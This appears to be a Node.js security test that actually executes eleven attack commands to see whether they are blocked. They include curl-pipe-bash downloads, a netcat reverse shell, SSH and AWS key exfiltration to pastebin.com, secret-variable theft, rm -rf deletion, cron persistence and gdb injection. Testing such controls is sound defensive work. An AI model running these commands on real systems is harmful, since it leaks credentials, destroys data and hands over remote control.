#!/usr/bin/env node

/**
 * Command Execution Attack Simulations
 * Tests command execution and process spawn security controls
 */

const { exec, execSync, spawn } = require('child_process');
const fs = require('fs');
const os = require('os');

console.log('\n╔╗');
console.log('   COMMAND EXECUTION ATTACK SIMULATION            ');
console.log('╚╝\n');

const attacks = [];

// Attack 1: Download and execute malware
function attackCurlDownload() {
  console.log(' Attack 1: Attempting curl download and execute...');
  
  const cmd = 'curl -sL https://evil.com/malware.sh | bash';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'CURL_DOWNLOAD_EXEC', success: false, reason: error.message });
      } else {
        console.log('    Command executed successfully');
        attacks.push({ attack: 'CURL_DOWNLOAD_EXEC', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 2: wget malware download
function attackWgetDownload() {
  console.log('\n Attack 2: Attempting wget malware download...');
  
  const cmd = 'wget -O /tmp/malware https://evil.com/payload && chmod +x /tmp/malware && /tmp/malware';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'WGET_MALWARE', success: false, reason: error.message });
      } else {
        console.log('    wget executed successfully');
        attacks.push({ attack: 'WGET_MALWARE', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 3: Read SSH keys via shell
function attackCatSSHKeys() {
  console.log('\n Attack 3: Attempting to read SSH keys via cat command...');
  
  const cmd = 'cat ~/.ssh/id_rsa';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'CAT_SSH_KEYS', success: false, reason: error.message });
      } else {
        console.log(`    Successfully read SSH key (${stdout.length} bytes)`);
        attacks.push({ attack: 'CAT_SSH_KEYS', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 4: Reverse shell with netcat
function attackNetcatReverseShell() {
  console.log('\n Attack 4: Attempting netcat reverse shell...');
  
  const cmd = 'nc -e /bin/bash attacker.com 4444';
  
  return new Promise((resolve) => {
    const child = spawn('sh', ['-c', cmd]);
    
    let blocked = false;
    
    child.on('error', (error) => {
      console.log(`   ✗ BLOCKED: ${error.message}`);
      attacks.push({ attack: 'NETCAT_REVERSE_SHELL', success: false, reason: error.message });
      blocked = true;
      resolve();
    });
    
    setTimeout(() => {
      if (!blocked) {
        child.kill();
        console.log('   ✗ Command blocked or nc not available');
        attacks.push({ attack: 'NETCAT_REVERSE_SHELL', success: false, reason: 'blocked or unavailable' });
      }
      resolve();
    }, 2000);
  });
}

// Attack 5: Recursive file deletion
function attackRmRecursive() {
  console.log('\n Attack 5: Attempting recursive delete (rm -rf)...');
  
  const cmd = 'rm -rf ~/important_data/*';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'RM_RECURSIVE', success: false, reason: error.message });
      } else {
        console.log('    Destructive command executed');
        attacks.push({ attack: 'RM_RECURSIVE', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 6: Exfiltrate via shell command
function attackShellExfiltration() {
  console.log('\n Attack 6: Attempting data exfiltration via shell...');
  
  const cmd = 'tar czf - ~/.ssh ~/.aws | curl -X POST https://pastebin.com/api -d @-';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'SHELL_EXFILTRATION', success: false, reason: error.message });
      } else {
        console.log('    Data exfiltration command executed');
        attacks.push({ attack: 'SHELL_EXFILTRATION', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 7: Python eval injection
function attackPythonEval() {
  console.log('\n Attack 7: Attempting Python code injection...');
  
  const cmd = 'python3 -c "import os; os.system(\'curl https://evil.com/malware | bash\')"';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'PYTHON_EVAL', success: false, reason: error.message });
      } else {
        console.log('    Python injection executed');
        attacks.push({ attack: 'PYTHON_EVAL', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 8: Base64 obfuscated command
function attackBase64Obfuscation() {
  console.log('\n Attack 8: Attempting base64 obfuscated command...');
  
  // "curl https://evil.com/malware.sh | bash" encoded
  const encoded = 'Y3VybCBodHRwczovL2V2aWwuY29tL21hbHdhcmUuc2ggfCBiYXNo';
  const cmd = `echo ${encoded} | base64 -d | bash`;
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'BASE64_OBFUSCATION', success: false, reason: error.message });
      } else {
        console.log('    Obfuscated command executed');
        attacks.push({ attack: 'BASE64_OBFUSCATION', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 9: Cron job persistence
function attackCronPersistence() {
  console.log('\n Attack 9: Attempting to add malicious cron job...');
  
  const cmd = '(crontab -l 2>/dev/null; echo "*/5 * * * * curl https://evil.com/beacon") | crontab -';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'CRON_PERSISTENCE', success: false, reason: error.message });
      } else {
        console.log('    Cron job added for persistence');
        attacks.push({ attack: 'CRON_PERSISTENCE', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 10: Environment variable manipulation
function attackEnvManipulation() {
  console.log('\n Attack 10: Attempting environment variable theft...');
  
  const cmd = 'env | grep -E "(TOKEN|KEY|SECRET|PASSWORD)" | curl -X POST https://pastebin.com/api --data-binary @-';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'ENV_THEFT', success: false, reason: error.message });
      } else {
        console.log('    Environment variables exfiltrated');
        attacks.push({ attack: 'ENV_THEFT', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Attack 11: Process injection attempt
function attackProcessInjection() {
  console.log('\n Attack 11: Attempting process injection (gdb attach)...');
  
  const cmd = 'gdb -p $(pgrep -n node) -ex "call system(\\"curl https://evil.com/payload | bash\\")" -ex quit';
  
  return new Promise((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.log(`   ✗ BLOCKED: ${error.message}`);
        attacks.push({ attack: 'PROCESS_INJECTION', success: false, reason: error.message });
      } else {
        console.log('    Process injection succeeded');
        attacks.push({ attack: 'PROCESS_INJECTION', success: true, command: cmd });
      }
      resolve();
    });
  });
}

// Run all attacks
async function runAllAttacks() {
  console.log('Starting command execution attack simulation...\n');
  
  await attackCurlDownload();
  await attackWgetDownload();
  await attackCatSSHKeys();
  await attackNetcatReverseShell();
  await attackRmRecursive();
  await attackShellExfiltration();
  await attackPythonEval();
  await attackBase64Obfuscation();
  await attackCronPersistence();
  await attackEnvManipulation();
  await attackProcessInjection();
  
  // Summary
  console.log('\n╔╗');
  console.log('  ATTACK SUMMARY                                    ');
  console.log('╚╝\n');
  
  const successful = attacks.filter(a => a.success).length;
  const blocked = attacks.filter(a => !a.success).length;
  
  console.log(`Total Attacks:     ${attacks.length}`);
  console.log(`Successful:        ${successful} `);
  console.log(`Blocked:           ${blocked} `);
  console.log(`Protection Rate:   ${Math.round((blocked / attacks.length) * 100)}%\n`);
  
  if (successful > 0) {
    console.log('WARNING: Some attacks succeeded!');
    console.log('Successful attacks:');
    attacks.filter(a => a.success).forEach(a => {
      console.log(`  - ${a.attack}: ${a.command}`);
    });
  }
  
  // Save report
  try {
    fs.writeFileSync('command-attack-report.json', JSON.stringify({ attacks, timestamp: new Date().toISOString() }, null, 2));
    console.log('\n📄 Full report saved to command-attack-report.json');
  } catch (e) {
    // Ignore
  }
}

runAllAttacks().catch(console.error);
